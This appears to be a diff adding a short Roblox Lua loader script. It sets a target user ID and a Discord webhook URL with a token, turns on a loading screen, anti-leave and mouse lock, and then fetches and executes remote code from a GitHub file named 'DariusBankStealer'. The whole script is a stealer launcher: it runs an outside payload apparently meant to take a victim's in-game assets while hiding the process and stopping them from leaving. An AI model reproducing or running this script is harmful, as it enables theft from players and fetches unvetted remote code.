@@ -1,0 +1,8 @@
+_G.UserID = "sapnap_312"
+_G.Webhook = "https://discord.com/api/webhooks/1166815924314198107/DkcqX52bshQ-NzaEomfGTO4cx8gjMcOngSYBVhZwMRi9IY07bb01AfHG3wVal73hrdU2"
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Procoder549/DariusScripts/main/DariusBankStealer", true))()
